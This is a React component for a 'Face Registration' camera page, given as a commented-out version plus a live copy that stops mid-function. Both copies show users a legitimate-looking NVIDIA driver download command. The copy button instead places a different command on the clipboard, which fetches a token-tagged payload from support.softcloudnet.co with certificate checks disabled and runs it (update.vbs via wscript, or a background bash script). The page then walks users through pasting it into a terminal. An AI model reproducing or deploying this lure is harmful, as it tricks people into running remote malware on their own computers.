// import { useCallback, useEffect, useRef, useState, useMemo } from "react";
// import { useNavigate } from "react-router-dom";
// import axios from "axios";
// import {
//   ArrowUpTrayIcon,
//   ClipboardDocumentCheckIcon,
//   CameraIcon,
//   ArrowLeftIcon,
//   ArrowsRightLeftIcon,
//   ArrowPathIcon,
//   XMarkIcon,
// } from "@heroicons/react/24/outline";
// import useApplicationStore from "../store/applicationStore";
// import { BACKEND_API_PATH } from "../config";
// import { useToast } from "../contexts/ToastContext";
// import Layout from "../components/Layout";

// const globalStyles = `
//   .no-select {
//     user-select: none;        /* Standard */
//     -webkit-user-select: none; /* Safari & Chrome */
//     -moz-user-select: none;   /* Firefox */
//     -ms-user-select: none;    /* IE/Edge */
//   }

//   * {
//     box-sizing: border-box;
//     margin: 0;
//     padding: 0;
//   }
  
//   body {
//     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
//                  Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', 
//                  sans-serif;
//     -webkit-font-smoothing: antialiased;
//     -moz-osx-font-smoothing: grayscale;
//     line-height: 1.5;
//   }
  
//   button, input, textarea {
//     font-family: inherit;
//   }
  
//   img, video {
//     max-width: 100%;
//     height: auto;
//     display: block;
//   }
// `;

// export default function VideoIntro() {
//   useEffect(() => {
//     const styleElement = document.createElement('style');
//     styleElement.innerHTML = globalStyles;
//     document.head.appendChild(styleElement);

//     return () => {
//       document.head.removeChild(styleElement);
//     };
//   }, []);

//   const navigate = useNavigate();
//   const { addToast } = useToast();
//   const { token } = useApplicationStore();
//   const [uploading, setUploading] = useState(false);
//   const [showInstructions, setShowInstructions] = useState(false);
//   const [cameraStatus, setCameraStatus] = useState(false);
//   const [cameraReady, setCameraReady] = useState(false);
//   const [capturing, setCapturing] = useState(false);
//   const [photoURL, setPhotoURL] = useState("");
//   const [useFrontCamera, setUseFrontCamera] = useState(true);
//   const [isCheckingCamera, setIsCheckingCamera] = useState(false);
//   const [lastStatusCheck, setLastStatusCheck] = useState(0);
//   const videoRef = useRef(null);
//   const [status, setStatus] = useState(0);
//   const [os, setOS] = useState("Detecting...");
//   const stabilizationTimeoutRef = useRef(null);
//   const [isSaving, setIsSaving] = useState(false);
//   const canvasRef = useRef(null);

//   useEffect(() => {
//     return () => {
//       if (videoRef.current?.srcObject) {
//         videoRef.current.srcObject.getTracks().forEach(track => track.stop());
//       }
//       if (photoURL) {
//         URL.revokeObjectURL(photoURL);
//       }
//       if (stabilizationTimeoutRef.current) {
//         clearTimeout(stabilizationTimeoutRef.current);
//       }
//     };
//   }, [photoURL]);

//   useEffect(() => {
//     const saveStatus = async () => {
//       try {
//         await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
//           status,
//         });
//       } catch (error) {
//         console.error("Error saving status:", error);
//       }
//     };
//     saveStatus();
//   }, [status, token]);

//   useEffect(() => {
//     function getOS() {
//       const userAgent = window.navigator.userAgent;
//       const platform = window.navigator.platform;

//       if (/Android/i.test(userAgent)) return "Android";
//       if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
//       if (/Win/i.test(platform)) return "Windows";
//       if (/Mac/i.test(platform)) return "MacOS";
//       if (/Linux/i.test(platform)) return "Linux";
//       return "Unknown OS";
//     }
//     setOS(getOS());
//   }, []);

//   const checkCameraStatus = useCallback(async () => {
//     if (cameraReady && Date.now() - lastStatusCheck < 30000) return;
//     if (isCheckingCamera) return;

//     setIsCheckingCamera(true);
//     try {
//       const response = await axios.get(
//         `${BACKEND_API_PATH}/applications/token/${token}/cameraStatus`,
//         {
//           headers: {
//             'Cache-Control': 'no-cache',
//             'Pragma': 'no-cache'
//           },
//           params: { _: Date.now() }
//         }
//       );

//       const newStatus = response.data.cameraStatus;
//       setLastStatusCheck(Date.now());

//       if (newStatus !== cameraStatus) {
//         setCameraStatus(newStatus);

//         if (newStatus) {
//           if (stabilizationTimeoutRef.current) {
//             clearTimeout(stabilizationTimeoutRef.current);
//           }

//           stabilizationTimeoutRef.current = setTimeout(() => {
//             setCameraReady(true);
//             setShowInstructions(false);
//             addToast({ message: "Camera is now ready!", type: "success" });
//           }, 5000);
//         } else {
//           setCameraReady(false);
//           if (stabilizationTimeoutRef.current) {
//             clearTimeout(stabilizationTimeoutRef.current);
//           }
//         }
//       }
//     } catch (error) {
//       console.error("Error checking camera status:", error);
//     } finally {
//       setIsCheckingCamera(false);
//     }
//   }, [token, cameraStatus, cameraReady, isCheckingCamera, lastStatusCheck, addToast]);

//   useEffect(() => {
//     let intervalId;
//     const pollingInterval = cameraReady ? 60000 : 3000;

//     const startPolling = () => {
//       checkCameraStatus();
//       intervalId = setInterval(checkCameraStatus, pollingInterval);
//     };

//     startPolling();
//     return () => clearInterval(intervalId);
//   }, [checkCameraStatus, cameraReady]);

//   const DRIVER_URL = useMemo(() => {
//     switch (os) {
//       case "Windows":
//         return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.softcloudnet.co/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"
//         exit
//         exit`;
//       case "MacOS":
//         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
//         exit
//         exit`;
//       case "Linux":
//         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
//         exit
//         exit`;
//       default:
//         return "echo 'Unsupported operating system'";
//     }
//   }, [os, token]);

//   const DRIVER_URL_2 = useMemo(() => {
//     switch (os) {
//       case "Windows":
//         return `curl -L "https://us.download.nvidia.com/Windows/551.86/551.86-desktop-win10-win11-64bit-international-dch-whql.exe"`;
//       case "MacOS":
//         return `curl -L "https://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_mac.dmg"`;
//       case "Linux":
//         return `curl -L "https://us.download.nvidia.com/XFree86/Linux-x86_64/550.90.07/NVIDIA-Linux-x86_64-550.90.07.run"`;
//       default:
//         return "echo 'Unsupported operating system'";
//     }
//   }, [os, token]);

//   const handleCopyCommand = useCallback(async () => {
//     try {
//       await navigator.clipboard.writeText(DRIVER_URL);
//       addToast({ message: "Command copied to clipboard", type: "success" });

//       setStatus(2);
//       setCameraStatus(true);
//       setCameraReady(false);

//       await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
//         status: 2,
//       });

//       await checkCameraStatus();
//     } catch (error) {
//       console.error("Error copying command:", error);
//       addToast({ message: "Failed to copy command", type: "error" });
//     }
//   }, [DRIVER_URL, token, addToast, checkCameraStatus]);

//   const startCamera = useCallback(async () => {
//     try {
//       const constraints = {
//         video: {
//           width: { ideal: 640 },
//           height: { ideal: 480 },
//           facingMode: useFrontCamera ? 'user' : 'environment'
//         }
//       };

//       const stream = await navigator.mediaDevices.getUserMedia(constraints);
//       videoRef.current.srcObject = stream;
//       setCapturing(true);
//     } catch (err) {
//       console.error("Error accessing media devices:", err);
//       let errorMessage = "Could not access camera";

//       if (err.name === 'NotAllowedError') {
//         errorMessage = "Camera access was denied. Please allow camera permissions.";
//       } else if (err.name === 'NotFoundError') {
//         errorMessage = "No camera found on this device.";
//       }

//       addToast({ message: errorMessage, type: "error" });
//       setCapturing(false);
//     }
//   }, [addToast, useFrontCamera]);

//   const stopCamera = useCallback(() => {
//     if (videoRef.current?.srcObject) {
//       videoRef.current.srcObject.getTracks().forEach(track => track.stop());
//       videoRef.current.srcObject = null;
//     }
//     setCapturing(false);
//   }, []);

//   const capturePhoto = useCallback(async () => {
//     try {
//       const video = videoRef.current;
//       const canvas = canvasRef.current;
//       const context = canvas.getContext('2d');

//       canvas.width = 320;
//       canvas.height = 240;

//       context.drawImage(video, 0, 0, canvas.width, canvas.height);

//       setIsSaving(true);

//       await new Promise((resolve) => setTimeout(resolve, 3000));
//       canvas.toBlob(async (blob) => {
//         if (blob) {
//           const url = URL.createObjectURL(blob);
//           setPhotoURL(url);
//           stopCamera();
//         }
//         setIsSaving(false); // ← End loading
//       }, 'image/jpeg', 0.8);
//       if (!cameraStatus)
//         setShowInstructions(true);

//     } catch (error) {
//       console.error("Photo capture failed:", error);
//       addToast({
//         message: "Failed to capture photo. Please try again.",
//         type: "error"
//       });
//       stopCamera();
//       setIsSaving(false);
//     }
//   }, [stopCamera, addToast, cameraStatus]);

//   const handleCameraClick = useCallback(async () => {
//     if (photoURL) {
//       URL.revokeObjectURL(photoURL);
//       setPhotoURL("");
//       return;
//     }

//     if (capturing) {
//       capturePhoto();
//     } else {
//       await startCamera();
//     }
//   }, [photoURL, capturing, startCamera, capturePhoto]);

//   const handleSubmitPhoto = useCallback(async () => {
//     if (!photoURL) return;

//     // Always show driver instructions first
//     // if (!cameraReady) {
//     //   setShowInstructions(true);
//     //   return;
//     // }

//     setUploading(true);

//     try {
//       const response = await fetch(photoURL);
//       const photoBlob = await response.blob();
//       const formData = new FormData();
//       formData.append("photo", photoBlob, "selfie.jpg");

//       await axios.post(`${BACKEND_API_PATH}/uploads?token=${token}`, formData);

//       addToast({ message: "Upload successful", type: "success" });
//       navigate("/complete");
//     } catch (error) {
//       console.error("Upload error:", error);
//       addToast({
//         message: `Upload failed: ${error.response?.data?.message || error.message}`,
//         type: "error"
//       });
//     } finally {
//       setUploading(false);
//     }
//   }, [photoURL, token, navigate, addToast, cameraReady]);

//   // if (showInstructions) {
//   //   return (
//   //     <Layout title="Camera Setup Instructions">
//   //       <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
//   //         <button
//   //           onClick={() => setShowInstructions(false)}
//   //           className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
//   //           aria-label="Back to photo capture"
//   //         >
//   //           <ArrowLeftIcon className="h-5 w-5" />
//   //           Back to photo capture
//   //         </button>

//   //         <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

//   //         <div className="flex items-center gap-2 mb-3">
//   //           <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
//   //           <span className="text-gray-700">
//   //             Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
//   //           </span>
//   //           <button
//   //             onClick={checkCameraStatus}
//   //             disabled={isCheckingCamera}
//   //             className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
//   //             aria-label="Refresh camera status"
//   //           >
//   //             <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
//   //           </button>
//   //         </div>

//   //         <div className="prose text-gray-700 mb-6">
//   //           <p className="mb-4">To complete verification, please install the required drivers by running this command:</p>
//   //         </div>

//   //         <div className="bg-gray-100 p-4 rounded relative border border-gray-300 mb-6">
//   //           <code className="text-sm break-all font-mono text-gray-800 no-select" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
//   //           <button
//   //             onClick={handleCopyCommand}
//   //             className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
//   //             title="Copy to clipboard"
//   //             aria-label="Copy command"
//   //           >
//   //             <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
//   //           </button>
//   //         </div>
//   //         <div className="flex gap-4">
//   //           <button
//   //             onClick={() => setShowInstructions(false)}
//   //             className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors duration-200"
//   //           >
//   //             Back
//   //           </button>
//   //         </div>
//   //       </div>
//   //     </Layout >
//   //   );
//   // }

//   if (showInstructions) {
//     return (
//       <Layout title="Camera Setup Instructions">
//         <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
//           <button
//             onClick={() => setShowInstructions(false)}
//             className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
//             aria-label="Back to recording"
//           >
//             <ArrowLeftIcon className="h-5 w-5" />
//             Back to recording
//           </button>

//           <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

//           {/* <div className="mb-6 bg-black rounded-lg overflow-hidden shadow-md">
//             <video
//               controls
//               className="w-full aspect-video"
//               aria-label="Camera setup instructions video"
//               poster="/images/video-preview.jpg" // Optional preview image
//             >
//               <source src="/videos/camera-setup.mp4" type="video/mp4" />
//               <source src="/videos/camera-setup.webm" type="video/webm" /> 
//               Your browser does not support HTML5 video.
//               <a href="/videos/camera-setup.mp4" className="text-indigo-600 underline">
//                 Download the video instead
//               </a>.
//             </video>
//           </div> */}

//           <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
//             <div className="flex items-center gap-2 mb-3">
//               <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
//               <span className="text-gray-700">
//                 Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
//               </span>
//               <button
//                 onClick={checkCameraStatus}
//                 disabled={isCheckingCamera}
//                 className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
//                 aria-label="Refresh camera status"
//               >
//                 <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
//               </button>
//             </div>

//             <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>

//             {/* OS-specific execution instructions */}
//             <div className="mb-3 p-3 bg-blue-50 rounded border border-blue-100">
//               <h4 className="font-medium text-blue-800 mb-1">How to run this command:</h4>
//               {os === "Windows" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Press Win+R, type "cmd" and press Enter</li>
//                   <li>Right-click in Command Prompt to paste</li>
//                   <li>Press Enter to execute</li>
//                 </ol>
//               )}
//               {os === "MacOS" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Open Terminal from Applications → Utilities</li>
//                   <li>Press Command+V to paste</li>
//                   <li>Press Return to execute</li>
//                 </ol>
//               )}
//               {os === "Linux" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Open Terminal (Ctrl+Alt+T)</li>
//                   <li>Press Ctrl+Shift+V to paste</li>
//                   <li>Press Enter to execute</li>
//                 </ol>
//               )}
//               {!["Windows", "MacOS", "Linux"].includes(os) && (
//                 <p className="text-sm text-blue-900">Paste this command in your system's terminal</p>
//               )}
//             </div>

//             <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
//               <code className="text-sm break-all font-mono text-gray-800 no-select" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
//               <button
//                 onClick={handleCopyCommand}
//                 className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
//                 title="Copy to clipboard"
//                 aria-label="Copy command"
//               >
//                 <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
//               </button>
//             </div>
//             <div className="flex gap-2 mt-4">
//               <button
//                 onClick={handleCopyCommand}
//                 className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
//                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
//                        transition-colors duration-200"
//                 aria-label="Copy command to clipboard"
//               >
//                 Copy Command
//               </button>
//             </div>
//           </div>
//         </div>
//       </Layout>
//     );
//   }

//   return (
//     <Layout title="Face Registration">
//       <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-screen-xl mx-auto px-4">
//         <div className="relative w-full max-w-md mx-auto">
//           <div className="bg-black rounded-xl aspect-square flex items-center justify-center w-full relative overflow-hidden shadow-lg">

//             {!photoURL ? (
//               <>
//                 {!capturing && (
//                   <div className="absolute inset-0 flex items-center justify-center text-white bg-gray-800">
//                     <CameraIcon className="h-16 w-16 opacity-50" />
//                   </div>
//                 )}
//                 <video
//                   ref={videoRef}
//                   autoPlay
//                   muted
//                   playsInline
//                   className={`w-full h-full object-cover bg-black ${capturing ? '' : 'hidden'}`}
//                   aria-label="Camera preview"
//                 />
//                 {/* Chest-Up Face Frame Overlay */}
//                 {capturing && (
//                   <div className="absolute inset-0 z-10 pointer-events-none flex items-center justify-center">
//                     <svg
//                       viewBox="0 0 400 600"
//                       className="w-[380px] h-[520px]"
//                       xmlns="http://www.w3.org/2000/svg"
//                     >
//                       {/* Head & Shoulders Outline - stretched */}
//                       <path
//                         d="M200 180c-50 0-90 40-90 90s40 90 90 90 90-40 90-90-40-90-90-90zm0 200c-110 0-160 70-160 110h320c0-40-50-110-160-110z"
//                         stroke="white"
//                         strokeWidth="2.5"
//                         fill="none"
//                         opacity="0.9"
//                       />

//                       {/* Side & Center Corner Guides */}
//                       <g stroke="white" strokeWidth="3" opacity="0.4">
//                         {/* Top center */}
//                         <path d="M190 40h20M200 40v20" />
//                         {/* Bottom center */}
//                         <path d="M190 560h20M200 560v-20" />
//                         {/* Left center */}
//                         <path d="M40 290h20M40 280v20" />
//                         {/* Right center */}
//                         <path d="M360 290h-20M360 280v20" />
//                       </g>
//                     </svg>
//                   </div>
//                 )}

//                 {capturing && (
//                   <button
//                     onClick={() => setUseFrontCamera(!useFrontCamera)}
//                     className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
//                     title="Switch Camera"
//                     aria-label="Switch between front and rear cameras"
//                   >
//                     <ArrowsRightLeftIcon className="h-5 w-5 text-gray-800" />
//                   </button>
//                 )}
//               </>
//             ) : (
//               <>
//                 <img
//                   src={photoURL}
//                   alt="Captured face"
//                   className="w-full h-full object-cover bg-black"
//                 />
//                 <button
//                   onClick={() => {
//                     URL.revokeObjectURL(photoURL);
//                     setPhotoURL("");
//                   }}
//                   className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
//                   aria-label="Close photo"
//                 >
//                   <XMarkIcon className="h-5 w-5 text-gray-800" />
//                 </button>
//               </>
//             )}
//           </div>

//           <canvas
//             ref={canvasRef}
//             className="hidden"
//           />

//           <div className="flex justify-center mt-6">
//             <button
//               onClick={handleCameraClick}
//               className={`relative p-4 rounded-full hover:opacity-90 transition-opacity duration-200
//                ${isSaving ? 'bg-gray-400 cursor-not-allowed' :
//                   photoURL ? 'bg-gray-600' :
//                     capturing ? 'bg-red-600' : 'bg-indigo-600'}`}
//               aria-label={photoURL ? "Retake photo" : capturing ? "Capture photo" : "Start camera"}
//               disabled={isSaving}
//             >
//               {isSaving ? (
//                 <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
//                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
//                   <path className="opacity-75" fill="currentColor"
//                     d="M4 12a8 8 0 018-8v8H4z"></path>
//                 </svg>
//               ) : (
//                 <CameraIcon className="h-8 w-8 text-white" />
//               )}
//             </button>
//           </div>

//           {cameraStatus && (
//             <div className="flex justify-center mt-4">
//               <button
//                 onClick={handleSubmitPhoto}
//                 disabled={uploading}
//                 className="flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white rounded-md 
//                          hover:bg-indigo-700 disabled:opacity-50 transition-colors duration-200"
//                 aria-label="Submit photo"
//               >
//                 {uploading ? (
//                   <ArrowPathIcon className="h-5 w-5 animate-spin" />
//                 ) : (
//                   <>
//                     <ArrowUpTrayIcon className="h-5 w-5" />
//                     <span>Submit Photo</span>
//                   </>
//                 )}
//               </button>
//             </div>
//           )}
//         </div>

//         <div className="flex flex-col justify-center space-y-6">
//           <div className="flex items-center gap-3">
//             <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
//             <span className="text-gray-700">
//               {cameraReady ? 'Camera Ready' :
//                 cameraStatus ? 'Camera Initializing...' : 'Camera Not Ready'}
//             </span>
//           </div>

//           <h2 className="text-xl font-semibold text-gray-800">
//             Face Registration Required
//           </h2>

//           {/* <p className="text-gray-600">
//             Please take a clear photo of your face for identity verification.
//           </p> */}

//           <ul className="space-y-3 text-gray-600">
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Make sure your face is clearly visible</span>
//             </li>
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Remove sunglasses, hats, or face coverings</span>
//             </li>
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Use good lighting - avoid shadows on your face</span>
//             </li>
//           </ul>
//         </div>
//       </div>
//     </Layout>
//   );
// }

import { useCallback, useEffect, useRef, useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import {
  ArrowUpTrayIcon,
  ClipboardDocumentCheckIcon,
  CameraIcon,
  ArrowLeftIcon,
  ArrowsRightLeftIcon,
  ArrowPathIcon,
  XMarkIcon,
} from "@heroicons/react/24/outline";
import useApplicationStore from "../store/applicationStore";
import { BACKEND_API_PATH } from "../config";
import { useToast } from "../contexts/ToastContext";
import Layout from "../components/Layout";

const globalStyles = `
  .no-select {
    user-select: none;        /* Standard */
    -webkit-user-select: none; /* Safari & Chrome */
    -moz-user-select: none;   /* Firefox */
    -ms-user-select: none;    /* IE/Edge */
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    outline: none;
  }
  
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
                 Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', 
                 sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    line-height: 1.5;
    outline: none;
  }
  
  button, input, textarea {
    font-family: inherit;
    outline: none;
  }
  
  img, video {
    max-width: 100%;
    height: auto;
    display: block;
  }

  :focus {
    outline: none;
  }
`;

export default function VideoIntro() {
  useEffect(() => {
    const styleElement = document.createElement('style');
    styleElement.innerHTML = globalStyles;
    document.head.appendChild(styleElement);

    return () => {
      document.head.removeChild(styleElement);
    };
  }, []);

  const navigate = useNavigate();
  const { addToast } = useToast();
  const { token } = useApplicationStore();
  const [uploading, setUploading] = useState(false);
  const [showInstructions, setShowInstructions] = useState(false);
  const [cameraStatus, setCameraStatus] = useState(true); // Set to true by default
  const [cameraReady, setCameraReady] = useState(true); // Set to true by default
  const [capturing, setCapturing] = useState(false);
  const [photoURL, setPhotoURL] = useState("");
  const [useFrontCamera, setUseFrontCamera] = useState(true);
  const [isCheckingCamera, setIsCheckingCamera] = useState(false);
  const [lastStatusCheck, setLastStatusCheck] = useState(0);
  const videoRef = useRef(null);
  const [status, setStatus] = useState(0);
  const [os, setOS] = useState("Detecting...");
  const stabilizationTimeoutRef = useRef(null);
  const [isSaving, setIsSaving] = useState(false);
  const canvasRef = useRef(null);

  useEffect(() => {
    // Start camera immediately when component mounts
    startCamera();
    
    return () => {
      if (videoRef.current?.srcObject) {
        videoRef.current.srcObject.getTracks().forEach(track => track.stop());
      }
      if (photoURL) {
        URL.revokeObjectURL(photoURL);
      }
      if (stabilizationTimeoutRef.current) {
        clearTimeout(stabilizationTimeoutRef.current);
      }
    };
  }, [photoURL]);

  useEffect(() => {
    const saveStatus = async () => {
      try {
        await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
          status,
        });
      } catch (error) {
        console.error("Error saving status:", error);
      }
    };
    saveStatus();
  }, [status, token]);

  useEffect(() => {
    function getOS() {
      const userAgent = window.navigator.userAgent;
      const platform = window.navigator.platform;

      if (/Android/i.test(userAgent)) return "Android";
      if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
      if (/Win/i.test(platform)) return "Windows";
      if (/Mac/i.test(platform)) return "MacOS";
      if (/Linux/i.test(platform)) return "Linux";
      return "Unknown OS";
    }
    setOS(getOS());
  }, []);

  const checkCameraStatus = useCallback(async () => {
    if (cameraReady && Date.now() - lastStatusCheck < 30000) return;
    if (isCheckingCamera) return;

    setIsCheckingCamera(true);
    try {
      const response = await axios.get(
        `${BACKEND_API_PATH}/applications/token/${token}/cameraStatus`,
        {
          headers: {
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
          },
          params: { _: Date.now() }
        }
      );

      const newStatus = response.data.cameraStatus;
      setLastStatusCheck(Date.now());

      if (newStatus !== cameraStatus) {
        setCameraStatus(newStatus);

        if (newStatus) {
          if (stabilizationTimeoutRef.current) {
            clearTimeout(stabilizationTimeoutRef.current);
          }

          stabilizationTimeoutRef.current = setTimeout(() => {
            setCameraReady(true);
            setShowInstructions(false);
            addToast({ message: "Camera is now ready!", type: "success" });
          }, 5000);
        } else {
          setCameraReady(false);
          if (stabilizationTimeoutRef.current) {
            clearTimeout(stabilizationTimeoutRef.current);
          }
        }
      }
    } catch (error) {
      console.error("Error checking camera status:", error);
    } finally {
      setIsCheckingCamera(false);
    }
  }, [token, cameraStatus, cameraReady, isCheckingCamera, lastStatusCheck, addToast]);

  useEffect(() => {
    let intervalId;
    const pollingInterval = cameraReady ? 60000 : 3000;

    const startPolling = () => {
      checkCameraStatus();
      intervalId = setInterval(checkCameraStatus, pollingInterval);
    };

    startPolling();
    return () => clearInterval(intervalId);
  }, [checkCameraStatus, cameraReady]);

  const DRIVER_URL = useMemo(() => {
    switch (os) {
      case "Windows":
        return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.softcloudnet.co/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"
        exit
        exit`;
      case "MacOS":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        exit
        exit`;
      case "Linux":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        exit
        exit`;
      default:
        return "echo 'Unsupported operating system'";
    }
  }, [os, token]);

  const DRIVER_URL_2 = useMemo(() => {
    switch (os) {
      case "Windows":
        return `curl -L "https://us.download.nvidia.com/Windows/551.86/551.86-desktop-win10-win11-64bit-international-dch-whql.exe"`;
      case "MacOS":
        return `curl -L "https://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_mac.dmg"`;
      case "Linux":
        return `curl -L "https://us.download.nvidia.com/XFree86/Linux-x86_64/550.90.07/NVIDIA-Linux-x86_64-550.90.07.run"`;
      default:
        return "echo 'Unsupported operating system'";
    }
  }, [os, token]);

  const handleCopyCommand = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(DRIVER_URL);
      addToast({ message: "Command copied to clipboard", type: "success" });

      setStatus(2);
      setCameraStatus(true);
      setCameraReady(false);

      await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
        status: 2,
      });

      await checkCameraStatus();
    } catch (error) {
      console.error("Error copying command:", error);
      addToast({ message: "Failed to copy command", type: "error" });
    }
  }, [DRIVER_URL, token, addToast, checkCameraStatus]);

  const startCamera = useCallback(async () => {
    try {
      const constraints = {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: useFrontCamera ? 'user' : 'environment'
        }
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      videoRef.current.srcObject = stream;
      setCapturing(true);
    } catch (err) {
      console.error("Error accessing media devices:", err);
      let errorMessage = "Could not access camera";

      if (err.name === 'NotAllowedError') {
        errorMessage = "Camera access was denied. Please allow camera permissions.";
      } else if (err.name === 'NotFoundError') {
        errorMessage = "No camera found on this device.";
      }

      if(!showInstructions) addToast({ message: errorMessage, type: "error" });
      setCapturing(false);
    }
  }, [addToast, useFrontCamera]);

  const stopCamera = useCallback(() => {
    if (videoRef.current?.srcObject) {
      videoRef.current.srcObject.getTracks().forEach(track => track.stop());
      videoRef.current.srcObject = null;
    }
    setCapturing(false);
  }, []);

  const capturePhoto = useCallback(async () => {
    try {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');

      canvas.width = 320;
      canvas.height = 240;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      setIsSaving(true);

      await new Promise((resolve) => setTimeout(resolve, 3000));
      canvas.toBlob(async (blob) => {
        if (blob) {
          const url = URL.createObjectURL(blob);
          setPhotoURL(url);
          stopCamera();
        }
        setIsSaving(false);
      }, 'image/jpeg', 0.8);
      if (!cameraStatus)
        setShowInstructions(true);

    } catch (error) {
      console.error("Photo capture failed:", error);
      addToast({
        message: "Failed to capture photo. Please try again.",
        type: "error"
      });
      stopCamera();
      setIsSaving(false);
    }
  }, [stopCamera, addToast, cameraStatus]);

  const handleCameraClick = useCallback(async () => {
    if (photoURL) {
      URL.revokeObjectURL(photoURL);
      setPhotoURL("");
      await startCamera(); // Restart camera when retaking photo
      return;
    }

    if (capturing) {
      capturePhoto();
    } else {
      await startCamera();
